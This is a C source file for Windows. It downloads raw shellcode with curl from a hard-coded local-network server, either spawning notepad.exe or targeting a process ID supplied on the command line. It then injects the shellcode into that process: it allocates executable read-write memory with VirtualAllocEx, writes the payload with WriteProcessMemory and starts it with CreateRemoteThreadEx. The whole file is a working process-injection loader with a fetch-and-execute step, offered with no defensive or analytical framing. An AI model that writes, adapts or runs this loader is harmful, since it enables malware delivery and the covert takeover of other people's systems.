#include <Windows.h>
#include <stdio.h>

const char* k = "[+]";
const char* i = "[*]";
const char* e = "[-]";

DWORD PID, TID = NULL;
LPVOID rBuffer = NULL;
HANDLE hProcess, hThread = NULL;
PROCESS_INFORMATION pi;
STARTUPINFOW si;

int main(int argc, char* argv[]) {

	if (argc < 2) {
		/* Create new Process */
		printf("No PID supplied going to create notepad process.\n", i);

		if (!CreateProcessW(L"C:\\Windows\\system32\\notepad.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
			printf("%s failed to create process, error: %ld", e, GetLastError());
			return EXIT_FAILURE;
		}
		PID = pi.dwProcessId;
		printf("%s process started! pid: %ld", k, PID);
	}
	else {
		PID = atoi(argv[1]);
	}
	printf("%s trying to open a handle to process (%ld)\n", i, PID);

	/* downloading shellcode. */
	printf("%s downloading the shellcode\n", i);

	FILE* fpipe;
	const char* command = "curl http://192.168.153.128/code.bin";
	char c = 0;
	unsigned char shellcode[460];
	int counter = 0;

	fpipe = (FILE*)_popen(command, "r");
	if (fpipe == NULL) {
		printf("%s Could not download the shellcode. Is the server up? error: %ld", e, GetLastError());
		return EXIT_FAILURE;
	}

	while (fread(&c, sizeof(c), 1, fpipe)) {
		shellcode[counter] = c;
		counter += 1;
	}
	_pclose(fpipe);

	printf("%s Shellcode downloaded.\n", i);

	/* open a handle to the process */
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

	if (hProcess == NULL) {
		printf("%s couldn't get a handle to the process (%ld), error: %ld", e, PID, GetLastError());
		return EXIT_FAILURE;
	}

	printf("%s got a handle to the process!\n--0x%p\n", k, hProcess);


	/* allocate bytes to process memory */
	rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	printf("%s allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions\n", k, sizeof(shellcode));

	WriteProcessMemory(hProcess, rBuffer, shellcode, sizeof(shellcode), NULL);
	printf("%s wrote %zu-bytes to process in memory.\n", k, sizeof(shellcode));

	/* create thread to run the payload */
	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);

	if (hThread == NULL) {
		printf("%s failed to get a handle to the thread, error: %ld", e, GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	printf("%s got a handle to the thread (%ld)\n--0x%p\n", k, TID, hThread);

	printf("%s waiting for thread to finish\n", i);
	WaitForSingleObject(hThread, INFINITE);
	printf("%s thread finished executing\n", k);

	printf("%s cleaning up\n", i);
	CloseHandle(hThread);
	CloseHandle(hProcess);
	printf("%s finished!", k);

	return EXIT_SUCCESS;
}